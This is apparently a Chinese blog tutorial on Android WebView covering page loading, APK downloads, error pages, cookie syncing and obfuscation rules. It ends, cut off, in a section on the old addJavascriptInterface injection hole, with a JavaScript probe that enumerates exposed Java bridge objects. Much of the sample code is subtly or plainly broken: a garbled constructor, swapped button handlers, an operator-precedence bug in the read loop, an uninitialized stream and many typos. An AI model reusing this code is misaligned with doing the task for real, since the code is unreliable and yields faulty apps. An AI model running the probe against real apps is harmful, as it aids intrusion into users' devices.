<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  <title>Android-WebView | afei_ask</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一、为什么要用WebView 兼容已有项目 可以动态更新 缺点：耗电、加载慢、发热  二、WebView的使用 1、在AndroidMainfest.xml中添加网络权限， 2、在activity中加载webview，为了防止调用系统的浏览器，去要添加setWebViewClient方法兼听则明   12345678WebView webView=(WebView)findViewById(R.i">
<meta name="keywords" content="Android">
<meta property="og:type" content="article">
<meta property="og:title" content="Android-WebView">
<meta property="og:url" content="http://yoursite.com/2018/01/24/android-webview/index.html">
<meta property="og:site_name" content="afei_ask">
<meta property="og:description" content="一、为什么要用WebView 兼容已有项目 可以动态更新 缺点：耗电、加载慢、发热  二、WebView的使用 1、在AndroidMainfest.xml中添加网络权限， 2、在activity中加载webview，为了防止调用系统的浏览器，去要添加setWebViewClient方法兼听则明   12345678WebView webView=(WebView)findViewById(R.i">
<meta property="og:locale" content="default">
<meta property="og:updated_time" content="2019-12-24T13:40:49.459Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Android-WebView">
<meta name="twitter:description" content="一、为什么要用WebView 兼容已有项目 可以动态更新 缺点：耗电、加载慢、发热  二、WebView的使用 1、在AndroidMainfest.xml中添加网络权限， 2、在activity中加载webview，为了防止调用系统的浏览器，去要添加setWebViewClient方法兼听则明   12345678WebView webView=(WebView)findViewById(R.i">
  
    <link rel="alternate" href="/atom.xml" title="afei_ask" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">afei_ask</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-android-webview" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/24/android-webview/" class="article-date">
  <time datetime="2018-01-24T13:04:52.000Z" itemprop="datePublished">2018-01-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Android-WebView
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="一、为什么要用WebView"><a href="#一、为什么要用WebView" class="headerlink" title="一、为什么要用WebView"></a>一、为什么要用WebView</h3><ul>
<li>兼容已有项目</li>
<li>可以动态更新</li>
<li>缺点：耗电、加载慢、发热</li>
</ul>
<h3 id="二、WebView的使用"><a href="#二、WebView的使用" class="headerlink" title="二、WebView的使用"></a>二、WebView的使用</h3><ul>
<li>1、在AndroidMainfest.xml中添加网络权限，</li>
<li>2、在activity中加载webview，为了防止调用系统的浏览器，去要添加setWebViewClient方法兼听则明</li>
</ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WebView webView=(WebView)findViewById(R.id.webView);</span><br><span class="line">webView.loadUrl(&quot;http://www.baidu.com&quot;);</span><br><span class="line">webView.setWebChromeClient(new WebChromeClient()&#123;</span><br><span class="line">	@Override</span><br><span class="line">  public void onReceivedTitle(WebView view,String title)&#123;</span><br><span class="line">  	super.onReceivedTitle(view,title);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="三、自定义WebView-的Title"><a href="#三、自定义WebView-的Title" class="headerlink" title="三、自定义WebView 的Title"></a>三、自定义WebView 的Title</h3><p>如何在加载页面时显示url信息呢？</p>
<ul>
<li>首先在activity_main.xml文件中添加一个表头的配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;RelativeLayout</span><br><span class="line">		andorid:id=&quot;@+id/web_title&quot;</span><br><span class="line">		android:layout_width=&quot;match_parent&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;50dip&quot;&gt;</span><br><span class="line">	  &lt;Button</span><br><span class="line">	   android:id=&quot;@+id/back&quot;</span><br><span class="line">	   android:layout_alignParentLeft=&quot;true&quot;</span><br><span class="line">	  	android:text=&quot;返回&quot;</span><br><span class="line">		android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;40dip&quot;&gt;</span><br><span class="line">	  </span><br><span class="line">	  &lt;TextView</span><br><span class="line">	   android:id=&quot;@+id/title&quot;</span><br><span class="line">	   android:layout_centerInParent=&quot;true&quot;</span><br><span class="line">		android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;wrap_content&quot;&gt;</span><br><span class="line">	  </span><br><span class="line">	  &lt;Button</span><br><span class="line">	   android:id=&quot;@+id/refresh&quot;</span><br><span class="line">	   android:layout_alignParentRight=&quot;true&quot;</span><br><span class="line">	  	android:text=&quot;刷新&quot;</span><br><span class="line">		android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;40dip&quot;&gt;</span><br><span class="line">&lt;RelativeLayout&gt;</span><br><span class="line">&lt;WebView</span><br><span class="line">		andorid:id=&quot;@+id/webView&quot;</span><br><span class="line">		android:layout_width=&quot;match_parent&quot;</span><br><span class="line">	 	andorid:layout_height=&quot;match_parent&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>然后在activity中写入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Button back=(Button)findViewById(R.id.back);</span><br><span class="line">Button refresh=(Button)findViewById(R.id.refresh);</span><br><span class="line"></span><br><span class="line">TextView titleView=(TextView)findViewById(R.id. title);</span><br><span class="line"></span><br><span class="line">webView.setWebChromeClient(new WebChromeClient()&#123;</span><br><span class="line"> 	@Override</span><br><span class="line">   public void onReceivedTitle(WebView view,String title)&#123;</span><br><span class="line">   titleView.setText(title);</span><br><span class="line">   	super.onReceivedTitle(view,title);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> back.setOnClickListener(new MyListener());</span><br><span class="line"> refresh.setOnClickListener(new MyListener());</span><br><span class="line"> </span><br><span class="line"> class MyListener implements View.OnClickListener&#123;</span><br><span class="line"> 	@Override</span><br><span class="line"> 	public void onClick(View view)&#123;</span><br><span class="line"> 		switch(view.getId())&#123;</span><br><span class="line"> 			case R.id.back:</span><br><span class="line"> 				//刷新</span><br><span class="line"> 				webView.reload();</span><br><span class="line"> 				break;</span><br><span class="line"> 			case R.id.refresh:</span><br><span class="line"> 				finish();</span><br><span class="line"> 				break;</span><br><span class="line"> 			default:</span><br><span class="line"> 				break;</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="四、利用WebView下载文件"><a href="#四、利用WebView下载文件" class="headerlink" title="四、利用WebView下载文件"></a>四、利用WebView下载文件</h3><p>若要使浏览器可以下载文件，需要让webView实现一个接口</p>
<h4 id="1、手动创建一个HttpThread类"><a href="#1、手动创建一个HttpThread类" class="headerlink" title="1、手动创建一个HttpThread类"></a>1、手动创建一个HttpThread类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpThread</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> String mUrl;</span><br><span class="line">	<span class="comment">//传递进来要下载的地址</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">HttpThread</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.mUrl=url;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">		   System.out.println(<span class="string">"开始下载"</span>);</span><br><span class="line">			URL httpUrl=<span class="keyword">new</span> URL(mUrl);</span><br><span class="line">			HttpURLConnection conn=(HttpURLConnection)httpUrl.openConnection();</span><br><span class="line">			conn.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">			conn.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">			<span class="comment">//输入流对象</span></span><br><span class="line">			InputStream in=conn.getInputStream();</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//输出流对象</span></span><br><span class="line">			OutputStream out;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//下载目录</span></span><br><span class="line">			File downloadFile;</span><br><span class="line">			File sdFile;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//判断SD卡是否已挂载</span></span><br><span class="line">			<span class="keyword">if</span>(Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))&#123;</span><br><span class="line">				downloadFile=Environment.getExternalStorageDirectory();</span><br><span class="line">				sdFile=<span class="keyword">new</span> File(downloadFile,<span class="string">"test.apk"</span>);</span><br><span class="line">				</span><br><span class="line">				out=<span class="keyword">new</span> FileOutputStream(sdFile);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">byte</span>[] b=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">6</span>*<span class="number">1024</span>];</span><br><span class="line">			<span class="keyword">int</span> len;</span><br><span class="line">			<span class="keyword">while</span>(len=in.read(b)!=-<span class="number">1</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>(out!=<span class="keyword">null</span>)&#123;</span><br><span class="line">					out.write(b,<span class="number">0</span>,len);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span>(out!=<span class="keyword">null</span>)&#123;</span><br><span class="line">				out.close();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(in!=<span class="keyword">null</span>)&#123;</span><br><span class="line">				in.close();</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(<span class="string">"下载完成"</span>);</span><br><span class="line">			</span><br><span class="line">		&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2、然后给webView实现DownloadListenr"><a href="#2、然后给webView实现DownloadListenr" class="headerlink" title="2、然后给webView实现DownloadListenr"></a>2、然后给webView实现DownloadListenr</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">webView.loadUrl(<span class="string">"http://shouji.baidu.com"</span>);</span><br><span class="line"></span><br><span class="line">webView.setDownloadListener(<span class="keyword">new</span> MyDownload());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDownload</span> <span class="keyword">implements</span> <span class="title">DownloadListener</span></span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDownloadStart</span><span class="params">(String url,String userAgent,</span></span></span><br><span class="line"><span class="function"><span class="params">	String contentDisposition,String mimetype,<span class="keyword">long</span> contentLength)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//判断要下载的文件类型</span></span><br><span class="line">		<span class="keyword">if</span>(url.endWith(<span class="string">".apk"</span>))&#123;</span><br><span class="line">			<span class="keyword">new</span> HttpThread(url).start();</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样的话，如果页面中有下载的操作，就会按照我们的步骤执行了</p>
<h4 id="3、如何使用系统浏览器下载文件呢"><a href="#3、如何使用系统浏览器下载文件呢" class="headerlink" title="3、如何使用系统浏览器下载文件呢"></a>3、如何使用系统浏览器下载文件呢</h4><p>调用系统下载比较简单，也比较快</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDownload</span> <span class="keyword">implements</span> <span class="title">DownloadListener</span></span>&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDownloadStart</span><span class="params">(String url,String userAgent,</span></span></span><br><span class="line"><span class="function"><span class="params">	String contentDisposition,String mimetype,<span class="keyword">long</span> contentLength)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//判断要下载的文件类型</span></span><br><span class="line">		<span class="keyword">if</span>(url.endWith(<span class="string">".apk"</span>))&#123;</span><br><span class="line">			Uri uri=Uri.parse(url);</span><br><span class="line">			Intent intent=<span class="keyword">new</span> Intent(Intent.ACTION_VIEW,uri);</span><br><span class="line">			startActivity(intent);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="五、WebView的错误码处理"><a href="#五、WebView的错误码处理" class="headerlink" title="五、WebView的错误码处理"></a>五、WebView的错误码处理</h3><p>比如断网情况下加载一个页面，肯定会出现一个不太友好的页面，这样体验不好。常用的是加载一个本地的错误页面，或者一个native页面。怎么做呢</p>
<p><strong>只需要在webView的<code>setWebViewClient</code>监听中，重写<code>onReceiveError</code>方法即可</strong><br>首先需要在asserts目录下放置一个error.html文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> WebViewClent()&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view,String url)</span></span>&#123;</span><br><span class="line">		view.loadUrl(url);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.shouldOverrideUrlLoading(view , url);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onReceivedError</span><span class="params">(WebView view,<span class="keyword">int</span> errorCode,String description, String failingUrl)</span></span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.onRecievedError(view,errorCode,description,failingUrl);</span><br><span class="line">		<span class="comment">//加载本地错误页面</span></span><br><span class="line">		view.loadUrl(<span class="string">"file:///android_asset/error.html"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>当然也可以将WebView控件隐藏，显示另一显示错误的控件。同样是在<code>onReceivedError</code>方法中处理</p>
<h3 id="六、WebView的同步cookie"><a href="#六、WebView的同步cookie" class="headerlink" title="六、WebView的同步cookie"></a>六、WebView的同步cookie</h3><p>1、首先创建一个HTTPCookie的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpCookie</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//用来向外传递信息</span></span><br><span class="line">	<span class="keyword">private</span> Handler handler;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">HttpCookie</span><span class="params">(tends Thread&#123;</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">private</span> )</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.handler=handler;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.run();</span><br><span class="line">		HttpClient client=<span class="keyword">new</span> DefaultHttpClient();</span><br><span class="line">		</span><br><span class="line">		HttpPost post=<span class="keyword">new</span> HttpPost(<span class="string">"192.168.1.102:8080/webs/loign"</span>);</span><br><span class="line">		List&lt;NameValuePair&gt; list=<span class="keyword">new</span> ArrayList&lt;NameValuePair&gt;();</span><br><span class="line">		list.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">"name"</span>,<span class="string">"wanger"</span>));</span><br><span class="line">		list.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">"age"</span>,<span class="number">12</span>));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			post.setEntity(<span class="keyword">new</span> UrlEncodeFromEntity(list));</span><br><span class="line">			HttpResponse response=client.execute(post);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">if</span>(response.getStatusLine().getStatusCode()==<span class="number">200</span>)&#123;</span><br><span class="line">				AbstractHttpClient absClient=(AbstractHttpClient)client;</span><br><span class="line">				</span><br><span class="line">				List&lt;Cookie&gt; cookies=absClient.getCookieStore().getCookies();</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span>(Cookie cookie :cookies)&#123;</span><br><span class="line">					System.out.println(<span class="string">"name="</span>+cookie.getName()+<span class="string">"age="</span>+cookie.getValue);</span><br><span class="line">					</span><br><span class="line">					Message message=<span class="keyword">new</span> Message();</span><br><span class="line">					message.obj=cookie;</span><br><span class="line">					handler.sendMessage(message);</span><br><span class="line">					</span><br><span class="line">					<span class="keyword">return</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、然后在MainActivity中相应的地方添加 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Handler handler=<span class="keyword">new</span> Handler()&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handlerMessage</span><span class="params">(android.os.Message msg)</span></span>&#123;</span><br><span class="line">		String cookie=msg.obj.toString();</span><br><span class="line">		</span><br><span class="line">		CookieSyncManager.createInstance(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">		CookieManager cookieManager=CookieManager.getInstance();</span><br><span class="line">		cookieManager.setAcceptCookie(<span class="keyword">true</span>);</span><br><span class="line">		cookieManager.setCookie(<span class="string">"http://192.168.1.102:8080"</span>,cookie);</span><br><span class="line">		CookieSyncManager.getInstance().sync();</span><br><span class="line">		</span><br><span class="line">		webView.loadUrl(<span class="string">"192.168.1.102:8080/webs/index.html"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> HttpCookie(handler).start();</span><br></pre></td></tr></table></figure>
<h3 id="七、WebView与JS调用混淆问题"><a href="#七、WebView与JS调用混淆问题" class="headerlink" title="七、WebView与JS调用混淆问题"></a>七、WebView与JS调用混淆问题</h3><p>正常情况下WebView和JS是可以互相调用的，到那时当把apk发布时需要一个release包，而release包通常需要混淆处理，就会发生WebView与JS无法调用。<br>比如<br>1、创建一个类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebHost</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Context context;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">WebHost</span><span class="params">(Context context)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.context=context;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">callJs</span><span class="params">()</span></span>&#123;</span><br><span class="line">		Toast.makeText(context,<span class="string">"call form js"</span>,Toast.LENGTH_LONG);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、然后在MainActivity中添加</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webView.getSetting().setJavaScriptEnable(<span class="keyword">true</span>);</span><br><span class="line">webView.addJavaScriptInterface(<span class="keyword">new</span> WebHost(<span class="keyword">this</span>),<span class="string">"js"</span>);</span><br></pre></td></tr></table></figure>
<p>3、最后在html页面中添加一个js方法,并给某个按钮添加监听</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">call</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	js.callJs();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时运行app是可以正常调用js的方法的，但是对代码混淆后，却发现不能用了，这时需要在混淆配置文件中将相应的类添加进入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-keep public class com.example.webview01.WebHost&#123;</span><br><span class="line">	public &lt;methods&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这时混淆后的代码就可以正常执行了 </p>
<h3 id="八、WebView导致的远程注入问题"><a href="#八、WebView导致的远程注入问题" class="headerlink" title="八、WebView导致的远程注入问题"></a>八、WebView导致的远程注入问题</h3><p>如果通过恶意代码从web页面拿到手机上的照片等信息，会很危险。4.2之后已修复。<br>如下面的js代码，遍历js对象，拿到映射的java对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="built_in">window</span>)&#123;</span><br><span class="line">		<span class="keyword">try</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="string">"getClass"</span> <span class="keyword">in</span> <span class="built_in">window</span>[obj])&#123;</span><br><span class="line">				<span class="keyword">try</span>&#123;</span><br><span class="line">					<span class="built_in">window</span>[obj].getClass();</span><br><span class="line">					<span class="built_in">document</span>.write(<span class="string">'&lt;span style="color:red;font-size:22px"&gt;'</span></span><br><span class="line">					+obj+<span class="string">'&lt;/span&gt;'</span>);</span><br><span class="line">					<span class="built_in">document</span>.write(<span class="string">'&lt;br /&gt;'</span>);</span><br><span class="line">				&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 